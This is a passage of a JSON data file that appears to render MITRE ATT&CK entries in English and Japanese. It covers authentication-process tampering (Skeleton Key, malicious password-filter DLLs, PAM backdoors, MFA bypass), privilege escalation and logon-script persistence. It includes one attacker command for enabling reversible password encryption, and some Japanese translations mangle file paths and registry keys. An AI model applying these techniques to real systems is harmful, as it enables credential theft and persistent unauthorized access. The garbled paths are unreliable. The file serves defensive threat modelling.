                "description_eng": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
                "description_jp": "攻撃者は、認証メカニズムやプロセスを改ざんして、ユーザー認証情報にアクセスしたり、アカウントへの不当なアクセスを可能にしたりする可能性がある。認証プロセスは、Windows の Local Security Authentication Server (LSASS) プロセスや Security Accounts Manager (SAM)、Unix ベースのシステムの Pluggable Authentication Module (PAM)、MacOS システムの Authorization Plugins などのメカニズムによって処理され、認証情報の収集、保存、検証を行う。認証プロセスを変更することで、敵は[Valid Accounts](https://attack.mitre.org/techniques/T1078)を使わずにサービスやシステムを認証できるかもしれない。\n\n敵対者はこのプロセスの一部を悪意を持って変更し、クレデンシャルを明らかにするか、認証メカニズムをバイパスする。侵害された認証情報またはアクセスは、ネットワーク内のシステム上のさまざまなリソースに配置されたアクセス制御をバイパスするために使用される可能性があり、VPN、Outlook Web Access、リモートデスクトップなどのリモートシステムや外部で利用可能なサービスへの永続的なアクセスに使用される可能性さえある。",
                "subtechniques": [
                    {
                        "id": "T1556.004",
                        "name_eng": "Network Device Authentication",
                        "name_jp": "ネットワーク機器認証",
                        "description_eng": "Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",
                        "description_jp": "攻撃者は、[Patch System Image](https://attack.mitre.org/techniques/T1601/001)を使用して、オペレーティングシステムにパスワードをハードコードし、ネットワークデバイス上のローカルアカウントのネイティブ認証メカニズムをバイパスする可能性がある。\n\n[システムイメージの修正](https://attack.mitre.org/techniques/T1601)は、ネットワークデバイスのオペレーティングシステムに、特定のパスワードを使用して敵にアクセスを提供するためのコードを埋め込む可能性があります。  この修正には、パッチを介してオペレーティングシステムイメージに埋め込まれる特定のパスワードが含まれます。  認証が試みられると、挿入されたコードはまずユーザー入力がパスワードかどうかをチェックする。もしそうなら、アクセスは許可される。そうでない場合、埋め込まれたコードは潜在的に有効な認証情報を検証するために認証情報を渡す。 引用：Mandiant - Synful Knock"
                    },
                    {
                        "id": "T1556.001",
                        "name_eng": "Domain Controller Authentication",
                        "name_jp": "ドメインコントローラ認証",
                        "description_eng": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",
                        "description_jp": "攻撃者は、ドメインコントローラの認証プロセスにパッチを当て、典型的な認証メカニズムをバイパスし、アカウントへのアクセスを可能にする可能性がある。\n\nマルウェアは、任意のユーザーのアカウントや認証情報にアクセスするためのバックドアを作成する目的で、ドメインコントローラの認証プロセスに偽の認証情報を注入するために使用される可能性があります（例：[Skeleton Key](https://attack.mitre.org/software/S0007)）。スケルトン・キーは、敵が標準認証システムをバイパスするために使用する可能性のある認証情報を使用して、エンタープライズ・ドメイン・コントローラの認証プロセス(LSASS)にパッチを適用することで機能する。いったんパッチが適用されると、敵対者は注入されたパスワードを使用して、（ドメインコントローラの再起動によってスケルトンキーがメモリから消去されるまで）ドメインユーザーアカウントとして認証に成功することができる。認証されたアクセスは、一要素認証環境内のホストおよび/またはリソースへの自由なアクセスを可能にする可能性がある(引用：Dell Skeleton)"
                    },
                    {
                        "id": "T1556.009",
                        "name_eng": "Conditional Access Policies",
                        "name_jp": "条件付きアクセス・ポリシー",
                        "description_eng": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                        "description_jp": "攻撃者は、条件付きアクセス・ポリシーを無効にしたり変更したりして、危殆化したア カウントへの永続的なアクセスを可能にすることがある。条件付きアクセス・ポリシーは、ID プロバイダおよび ID とアクセス管理システムによって使用 される追加の検証であり、リソースへのアクセスをユーザに許可すべきかどうかを決定する。\n\nたとえば、Entra ID、Okta、および JumpCloud では、IP アドレス、デバイスの登録状態、および多要素認証の使用に基づいて、ユー ザのアプリケーションへのアクセスを拒否することができる（引用：Microsoft Conditional Access）（引用：JumpCloud Conditional Access Policies）（引用：Okta Conditional Access Policies） 場合によっては、ID プロバイダは、さまざまな指標に基づいてサインインを拒否するリスクベースの測定 基準の使用もサポートしている。AWS と GCP では、IAM ポリシーに `condition` 属性を含めることができ、ソース IP、リクエストが行われた日付、リクエストされたリソースやリージョンの性質など、任意の制約を検証することができる（引用：AWS IAM Conditions）。\n\n信頼できる IP 範囲の追加、[多要素認証](https://attack.mitre.org/techniques/T1556/006) 要件の削除、[未使用/未サポートのクラウド領域](https://attack.mitre.org/techniques/T1535) の追加許可など、条件付きアクセスポリシーを変更することで、敵対者はアカウントへの永続的なアクセスを確保し、防御策を回避できる可能性がある。"
                    },
                    {
                        "id": "T1556.008",
                        "name_eng": "Network Provider DLL",
                        "name_jp": "ネットワークプロバイダDLL",
                        "description_eng": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) \n\nAdversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",
                        "description_jp": "攻撃者は、悪意のあるネットワークプロバイダ・ダイナミックリンク・ライブラリ（DLL）を登録し、認証プロセス中に平文のユーザー認証情報を取得する可能性がある。ネットワークプロバイダーDLLは、Windowsが特定のネットワークプロトコルとインターフェースすることを可能にし、アドオンの資格情報管理機能をサポートすることもできる(引用: Network Provider API)。ログオンプロセス中、Winlogon(対話型ログオンモジュール)はRPCを介してローカルの`mpnotify.exe`プロセスに資格情報を送信する。その後、`mpnotify.exe`プロセスは、ログオンイベントが発生していることを通知する際に、登録されたクレデンシャルマネージャとクレデンシャルをクリアテキストで共有する。 引用：NPPSPY - Huntress）（引用：NPPSPYビデオ）（引用：NPLogonNotify\n\n(引用: NPPSPY) 悪意のあるネットワークプロバイダ DLL は、`mpnotify.exe` から認証情報を受け取るように設定できる。(引用: NPPSPY) 認証情報マネージャとして (レジストリを介して) インストールされると、悪意のある DLL は、`NPLogonNotify()` 関数を介して、ユーザーが Windows ワークステーションまたはドメインにログオンするたびに認証情報を受け取り、保存できる。\n\n攻撃者は、サーバーやドメインコントローラなど、ログオンアクティビティや管理者ログオンアクティビティが増加していることが知られているシステムに、悪意のあるネットワークプロバイダ DLL を植え付けることを標的にする可能性がある(引用：NPPSPY - Huntress)。"
                    },
                    {
                        "id": "T1556.002",
                        "name_eng": "Password Filter DLL",
                        "name_jp": "パスワードフィルタDLL",
                        "description_eng": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",
                        "description_jp": "攻撃者は、悪意のあるパスワード・フィルタ・ダイナミック・リンク・ライブラリ（DLL）を認証プロセスに登録し、認証されたユーザー認証情報を取得する可能性がある。\n\nWindows パスワード・フィルタは、ドメイン・アカウントとローカル・アカウントの両方に対するパスワー ド・ポリシー強制メカニズムである。フィルタは、パスワードポリシーに照らして潜在的なパスワードを検証するメソッドを含む DLL として実装されます。フィルターDLLは、ローカルアカウントの場合はローカルコンピューター上に、 ドメインアカウントの場合はドメインコントローラー上に置くことができる。新しいパスワードをSecurity Accounts Manager (SAM)に登録する前に、Local Security Authority (LSA)は登録された各フィルタに検証を要求する。登録されたすべてのフィルタが検証を承認するまで、変更される可能性のある内容は有効にならない。\n\n攻撃者は、ローカルコンピュータやドメイン全体から認証情報を採取するために、悪意のあるパスワードフィルタを登録することができる。適切な検証を行うには、フィルタは LSA からプレーンテキストの認証情報を受け取らなければならない。悪意のあるパスワードフィルタは、パスワード要求が行われるたびに、これらのプレーンテキストの認証情報を受け取ることになる(引用：Carnal Ownage Password Filters Sept 2013)"
                    },
                    {
                        "id": "T1556.006",
                        "name_eng": "Multi-Factor Authentication",
                        "name_jp": "多要素認証",
                        "description_eng": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)",
                        "description_jp": "攻撃者は、侵害されたアカウントへの持続的なアクセスを可能にするために、多要素認証（MFA）メカニズムを無効にしたり、変更したりする可能性がある。\n\n敵対者は、MFA を欠くアカウントを侵害するか、[Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) のような MFA バイパス手法を採用することでネットワークにアクセスできるようになると、そのアクセス権を活用して MFA 防御を変更したり、完全に無効にしたりする可能性があります。これは、Azure ADの条件付きアクセスポリシーからユーザーを除外する、新しいが脆弱である/敵に制御されたMFAメソッドを登録する、または期待される機能をバイパスするためにMFAプログラムや設定ファイルに手動でパッチを適用するなど、正当な機能を悪用することによって達成することができる。 引用：Mandiant APT42）（引用：Azure ADの条件付きアクセス除外について\n\n例えば、MFA 呼び出しを MFA サーバではなく localhost にリダイレクトするように、Windows の hosts ファイル（`C:∕windowssystem∕drivers∕drivers∕cachehosts`）を変更すると、MFA プロセスが失敗する可能性がある。フェイルオープン」ポリシーが設定されている場合、そうでなければ成功した認証の試みは、MFAを実施することなくアクセスが許可される可能性がある。(引用: ロシア人によるデフォルト MFA プロトコルの悪用 - CISA March 2022)\n\n敵対者の範囲、目的、権限によっては、MFA 防御が個々のアカウントに対して無効にされる場合もあれば、被害者のネットワーク環境内のすべてのドメインアカウントなど、より大きなグループに関連付けられたすべてのアカウントに対して無効にされる場合もある（引用：Russians Exploit Default MFA Protocol - CISA March 2022）。"
                    },
                    {
                        "id": "T1556.007",
                        "name_eng": "Hybrid Identity",
                        "name_jp": "ハイブリッド・アイデンティティ",
                        "description_eng": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                        "description_jp": "攻撃者は、典型的な認証メカニズムを迂回し、クレデンシャルにアクセスし、アカウントへの永続的なアクセスを可能にするために、オンプレミス・ユーザ・アイデンティティに関連付けられたクラウド認証プロセスにパッチを当てたり、修正したり、その他の方法でバックドアを仕掛ける可能性がある。  \n\n多くの組織が、オンプレミスとクラウドベースの環境間で共有されるハイブリッド・ユーザ・ アイデンティティとハイブリッド・デバイス・アイデンティティを維持している。これらは様々な方法で維持することができる。例えば、Microsoft Entra IDには、Active DirectoryとEntra IDの間でIDを同期するための3つのオプションがある（引用：Azure AD Hybrid Identity）：\n\n* オンプレミスの特権アカウントが Active Directory と Entra ID の間でユーザーのパスワードハッシュを同期することで、Entra ID への認証が完全にクラウドで行われるようにする。\n* Entra IDの認証試行がオンプレミスのPTAエージェントに転送され、PTAエージェントがActive Directoryに対して認証情報を検証します。\n* Active DirectoryとEntra IDの間に信頼関係が確立される。\n\nAD FSは、AWSやGCPなどの他のSaaSやクラウドプラットフォームでも使用することができ、認証プロセスをAD FSに渡し、ハイブリッドユーザーのIDと権限を含むトークンを受け取る。\n\nハイブリッド・アイデンティティに関連付けられた認証プロセスを変更することで、敵対者はクラウド・リソースへの永続的な特権アクセスを確立できる可能性があります。たとえば、PTA エージェントを実行しているオンプレミスのサーバーを侵害する敵対者は、Entra ID への認証のすべての試みを承認し、ユーザー資格情報を記録する `AzureADConnectAuthenticationAgentService` プロセスに悪意のある DLL を注入することができます。(引用: Azure AD Connect for Read Teamers)(引用: AADInternals Azure AD On-Prem to Cloud) AD FSを使用する環境では、敵対者が`Microsoft.IdentityServer.Servicehost`構成ファイルを編集して悪意のあるDLLをロードする可能性がある。この悪意のあるDLLは、任意のクレームセットを持つ任意のユーザーに対して認証トークンを生成するため、多要素認証と定義されたAD FSポリシーをバイパスする(引用: MagicWeb)。\n\n場合によっては、敵対者はクラウドからハイブリッド ID 認証プロセスを変更することができる。たとえば、Entra ID テナントのグローバル管理者アカウントを侵害した敵対者は、Web コンソールを介して新しい PTA エージェントを登録できる可能性があり、同様に認証情報を採取して任意のユーザーとして Entra ID 環境にログインできるようになります（引用：Mandiant Azure AD Backdoors）。"
                    },
                    {
                        "id": "T1556.005",
                        "name_eng": "Reversible Encryption",
                        "name_jp": "可逆暗号化",
                        "description_eng": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
                        "description_jp": "敵対者は、Active Directory 認証の暗号化プロパティを悪用して、Windows システム上の資格情報にアクセスする可能性がある。<code>AllowReversiblePasswordEncryption</code> プロパティは、アカウントの可逆パスワード暗号化を有効にするか無効にするかを指定します。デフォルトでは、このプロパティは無効になっており（代わりに一方向ハッシュ関数の出力としてユーザー認証情報を格納する）、レガシーや他のソフトウェアがそれを必要としない限り、有効にすべきではありません。\n\nこのプロパティが有効になっている場合、および/または有効になっている後にユーザーがパスワードを変更した場合、敵対者はプロパティが有効になってから作成/変更されたパスワードの平文を取得できる可能性があります。パスワードを解読するために、敵は4つのコンポーネントを必要とする：\n\n1.Active Directoryのユーザー構造<code>userParameters</code>から暗号化されたパスワード(<code>G$RADIUSCHAP</code>)。\n2.同じく<code>userParameters</code>から16バイトのランダムに生成された値(<code>G$RADIUSCHAPKEY</code>)\n3.グローバルLSAシークレット (<code>G$MSRADIUSCHAPKEY</code>)\n4.リモートアクセス下位認証DLLにハードコードされた静的キー (<code>RASSFM.DLL</code>)\n\nこの情報があれば、敵は暗号化キーを複製し、暗号化されたパスワード値を復号化できる可能性がある(引用：how_pwd_rev_enc_1)(引用：how_pwd_rev_enc_2)\n\n敵対者は、ローカルグループポリシーエディタ、ユーザープロパティ、FGPP(Fine-Grained Password Policy)、または ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) モジュールを通して、様々なスコープでこのプロパティを設定することができる。(引用: dump_pwd_dcsync) PowerShellでは、敵は<code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>のようなコマンドを使用して、ユーザー設定に関連する変更を行うことができます。"
                    },
                    {
                        "id": "T1556.003",
                        "name_eng": "Pluggable Authentication Modules",
                        "name_jp": "プラガブル認証モジュール",
                        "description_eng": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                        "description_jp": "攻撃者は、pluggable authentication modules (PAM)を改変して、ユーザ認証情報にアクセスしたり、アカウントへの不当なアクセスを可能にしたりする可能性がある。PAM は、設定ファイル、ライブラリ、実行ファイルからなるモジュール・システムであり、 多くのサービスの認証を誘導する。最も一般的な認証モジュールは <code>pam_unix.so</code> であり、 <code>/etc/passwd</code> と <code>/etc/shadow</code> にあるアカウント認証情報を取得、設定、検証する。\n\n攻撃者はバックドアを作成するためにPAMシステムのコンポーネントを変更することができる。<code>pam_unix.so</code> のような PAM コンポーネントは、任意の敵が提供した値を正当な認証情報として受け入れるようにパッチを当てることができる。\n\nPAM システムに対する悪意のある変更も、クレデンシャルを盗むために悪用される可能性がある。PAM はパスワードを保存しないため、PAM コンポーネントと交換される値はプレーンテキストである可能性がある。(引用：PAM Creds)(引用：Apple PAM)"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0004",
        "name_eng": "Privilege Escalation",
        "name_jp": "特権のエスカレーション",
        "description_eng": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.",
        "description_jp": "敵はより高いレベルの許可を得ようとしている。\n\n特権の昇格は、敵対者がシステムやネットワーク上でより高いレベルのパーミッションを獲得するために使用するテクニックで構成されています。敵対者は、多くの場合、非特権アクセスでネットワークに侵入し、探索することができますが、目的を遂行するためには、上位の権限が必要になります。一般的なアプローチは、システムの弱点、設定ミス、脆弱性を利用することです。昇格アクセスには、次のような例があります：\n\n* SYSTEM/root レベル\n* ローカル管理者\n* 管理者レベルのユーザーアカウント\n* 特定のシステムへのアクセスまたは特定の機能を実行するユーザー・アカウント\n\n敵対者に永続性を持たせるOSの機能は、昇格したコンテキストで実行できるため、これらのテクニックは永続性のテクニックと重なることが多い。",
        "techniques": [
            {
                "id": "T1037",
                "name_eng": "Boot or Logon Initialization Scripts",
                "name_jp": "ブートまたはログオン初期化スクリプト",
                "description_eng": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "description_jp": "攻撃者は、ブートやログオンの初期化時に自動的に実行されるスクリプトを使用して、永続性を確立する可能性があります（引用：Mandiant APT29 Eye Spy Email 11月22日）（引用：Anomali Rocke 2019年3月）初期化スクリプトは、管理機能を実行するために使用することができ、多くの場合、他のプログラムを実行したり、内部のログサーバーに情報を送信したりすることがあります。これらのスクリプトは、オペレーティング システムや、ローカルまたはリモートで適用されるかどうかによって異なります。  \n\n攻撃者は、これらのスクリプトを使用して、1つのシステム上で永続性を維持することがある。ログオンスクリプトのアクセス構成によっては、ローカル認証情報または管理者アカウントのいずれかが必要となる場合がある。\n\nまた、ブートスクリプトやログオン初期化スクリプトの中には、より高い特権で実行されるものがあるため、敵対者は特権をエスカレートできる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1037.004",
                        "name_eng": "RC Scripts",
                        "name_jp": "RCスクリプト",
                        "description_eng": "Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",
                        "description_jp": "攻撃者は、Unixライクなシステムのスタートアップ時に実行されるRCスクリプトを修正することで、永続性を確立することができる。これらのファイルにより、システム管理者はスタートアップ時に異なるランレベル用のカスタムサービスをマッピングして起動することができる。RCスクリプトを変更するには、root権限が必要である。\n\n攻撃者は、悪意のあるバイナリパスやシェルコマンドを<code>rc.local</code>、<code>rc.common</code>、およびUnixライクなディストリビューションに固有のその他のRCスクリプトに追加することで、永続性を確立する可能性があります。(引用: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) 再起動時に、システムはスクリプトの内容をrootとして実行し、永続性をもたらします。\n\nRCスクリプトを悪用する攻撃者は、ESXiハイパーバイザー、IoT、組み込みシステムなど、デフォルトでrootユーザーを使用する軽量のUnix系ディストリビューションで特に効果的です。(引用：intezer-kaiji-malware) ESXiサーバーはほとんどのシステムファイルをメモリに保存するため、シャットダウン時に変更を破棄します。\n\nいくつかのUnixライクなシステムはSystemdに移行し、RCスクリプトの使用を非推奨とした。これは現在、macOSでは非推奨のメカニズムであり、[Launchd](https://attack.mitre.org/techniques/T1053/004)を採用しています。(引用: Apple Developer Doco Archive Launchd)(Citation: Startup Items) このテクニックは、RCスクリプトをまだ実行しているMac OS X Panther v10.3以前のバージョンでも使用できます。(引用: Methods of Mac Malware Persistence) 後方互換性を維持するために、Ubuntuなどの一部のシステムでは、RCスクリプトが正しいファイルパーミッションで存在する場合、RCスクリプトを実行します。(引用: Ubuntu Manpage systemd rc)"
                    },
                    {
                        "id": "T1037.001",
                        "name_eng": "Logon Script (Windows)",
                        "name_jp": "ログオン・スクリプト（Windows）",
                        "description_eng": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                        "description_jp": "攻撃者は、ログオン初期化時に自動的に実行されるWindowsログオンスクリプトを使用して、永続性を確立する可能性がある。Windowsでは、特定のユーザーまたはユーザーグループがシステムにログインするたびにログオンスクリプトを実行することができます（引用：TechNet Logon Scripts）。これは、スクリプトへのパスを<code>HKCUUentEnvormentUserInitMprLogonScript</code>レジストリキーに追加することで実行されます（引用：Hexacorn Logon Scripts）。\n\n攻撃者はこれらのスクリプトを使用して、1つのシステム上で永続性を維持する可能性がある。ログオンスクリプトのアクセス構成によっては、ローカル認証情報または管理者アカウントが必要になる場合があります。"
                    },
                    {
                        "id": "T1037.003",
                        "name_eng": "Network Logon Script",
                        "name_jp": "ネットワークログオンスクリプト",
